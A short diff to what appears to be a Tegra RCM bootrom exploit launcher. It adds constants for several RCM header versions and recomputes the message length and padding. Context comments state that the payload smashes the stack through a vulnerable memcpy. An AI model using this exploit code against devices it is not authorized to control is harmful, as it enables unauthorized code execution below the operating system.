@@ -37,6 +37,11 @@ import binascii
 
 USB_XFER_MAX = 0x1000
 
+RCM_V1_HEADER_SIZE = 116
+RCM_V35_HEADER_SIZE = 628
+RCM_V40_HEADER_SIZE = 644
+RCM_V4P_HEADER_SIZE = 680
+
 # The address where the RCM payload is placed.
 # This is fixed for most device.
 RCM_PAYLOAD_ADDR    = 0x40008000
@@ -612,13 +617,17 @@ except OSError as e:
 # Prefix the image with an RCM command, so it winds up loaded into memory
 # at the right location (0x40010000).
 
+RCM_HEADER_SIZE = RCM_V1_HEADER_SIZE
+
 # Use the maximum length accepted by RCM, so we can transmit as much payload as
 # we want; we'll take over before we get to the end.
-length  = 0x30298
+length  = 0x30000 + RCM_HEADER_SIZE - 0x10
 payload = length.to_bytes(4, byteorder='little')
+print("Setting rcm msg size to 0x{:08x}".format(length))
+print("RCM payload (len_insecure): {}".format(binascii.hexlify(payload)))
 
-# pad out to 680 so the payload starts at the right address in IRAM
-payload += b'\0' * (680 - len(payload))
+# pad out to RCM_HEADER_SIZE so the payload starts at the right address in IRAM
+payload += b'\0' * (RCM_HEADER_SIZE - len(payload))
 
 # Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
 # We'll use this data to smash the stack when we execute the vulnerable memcpy.
